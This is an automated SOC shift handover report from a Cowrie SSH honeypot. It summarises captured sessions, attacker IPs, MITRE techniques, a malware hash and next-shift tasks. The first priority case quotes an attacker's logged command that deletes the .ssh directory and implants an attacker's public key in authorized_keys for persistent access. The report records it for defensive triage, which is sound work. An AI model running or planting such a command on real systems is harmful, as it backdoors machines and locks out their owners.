# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-09 |
| **Generated At** | 2026-03-09T02:42:50Z |
| **Shift Time** | 02:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **57** |
| Confirmed Threats | **47** |
| False Positives Filtered | **10** (17.5%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **10** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **0** HIGH · **0** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1c129d6e93ae

| Field | Detail |
|---|---|
| **Source IP** | `47.251.72.8` |
| **First Seen** | 2026-03-09 01:46 |
| **Last Seen** | 2026-03-09 01:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 01:46:52` | `cowrie.session.connect` |
| `2026-03-09 01:46:52` | `cowrie.client.version` |
| `2026-03-09 01:46:52` | `cowrie.client.kex` |
| `2026-03-09 01:46:53` | `cowrie.login.success` |
| `2026-03-09 01:46:53` | `cowrie.session.params` |
| `2026-03-09 01:46:53` | `cowrie.command.input` |
| `2026-03-09 01:46:53` | `cowrie.command.failed` |
| `2026-03-09 01:46:54` | `cowrie.log.closed` |
| `2026-03-09 01:46:54` | `cowrie.session.params` |
| `2026-03-09 01:46:54` | `cowrie.command.input` |
| `2026-03-09 01:46:55` | `cowrie.session.file_download` |
| `2026-03-09 01:46:55` | `cowrie.log.closed` |
| `2026-03-09 01:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.72.8` to AbuseIPDB if not already reported
- [ ] Block `47.251.72.8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21231c6abfab

| Field | Detail |
|---|---|
| **Source IP** | `47.251.72.8` |
| **First Seen** | 2026-03-09 01:46 |
| **Last Seen** | 2026-03-09 01:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 01:46:58` | `cowrie.session.connect` |
| `2026-03-09 01:46:58` | `cowrie.client.version` |
| `2026-03-09 01:46:58` | `cowrie.client.kex` |
| `2026-03-09 01:46:59` | `cowrie.login.success` |
| `2026-03-09 01:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.72.8` to AbuseIPDB if not already reported
- [ ] Block `47.251.72.8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.41.71` | **20** | 2026-03-09 01:13 | 2026-03-09 01:17 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `113.44.38.145` | **10** | 2026-03-09 01:48 | 2026-03-09 02:14 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `112.53.99.37` | **2** | 2026-03-09 01:43 | 2026-03-09 01:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.174.200.225` | **2** | 2026-03-09 02:13 | 2026-03-09 02:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.213.214.233` | 1 | 2026-03-09 02:31 | 2026-03-09 02:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.200.236.207` | 1 | 2026-03-09 01:33 | 2026-03-09 01:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.108.79.152` | 1 | 2026-03-09 02:35 | 2026-03-09 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.249.103.89` | 1 | 2026-03-09 01:48 | 2026-03-09 01:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.175.69` | 1 | 2026-03-09 00:18 | 2026-03-09 00:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.29.225.50` | 1 | 2026-03-09 01:01 | 2026-03-09 01:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `131.196.22.217` | 1 | 2026-03-09 01:15 | 2026-03-09 01:15 | 31s | 0 | `T1592` | 🟢 LOW |
| `150.246.249.149` | 1 | 2026-03-09 00:23 | 2026-03-09 00:24 | 31s | 0 | `T1592` | 🟢 LOW |
| `183.250.89.44` | 1 | 2026-03-09 02:34 | 2026-03-09 02:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `47.236.83.218` | 1 | 2026-03-09 00:53 | 2026-03-09 00:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `47.251.72.8` | 1 | 2026-03-09 01:46 | 2026-03-09 01:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (1 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.251.72.8` | US | Alibaba Cloud - US | **100** ⚠️ | 1 |
| `112.53.99.37` | CN | China Mobile Communications Corporation | **100** ⚠️ | 37 |
| `223.123.41.71` | PK | CMPak Limited | **100** ⚠️ | 2 |
| `1.213.214.233` | KR | LG DACOM Corporation | **100** ⚠️ | 15 |
| `124.29.225.50` | PK | Broadband Services | **100** ⚠️ | 21 |
| `131.196.22.217` | BR | CYBER TELECOM LTDA | **100** ⚠️ | 0 |
| `101.200.236.207` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 48 |
| `113.108.79.152` | CN | CHINANET Guangdong province network | **100** ⚠️ | 2 |
| `47.236.83.218` | SG | Alibaba Cloud LLC | **100** ⚠️ | 50 |
| `150.246.249.149` | JP | So-net Service | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 57 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 21 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 10 filtered (17.5%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 1 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 2 priority case(s) shown individually · 15 recon entry/entries in table (4 group(s) consolidating 34 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-09T02:42:50Z_
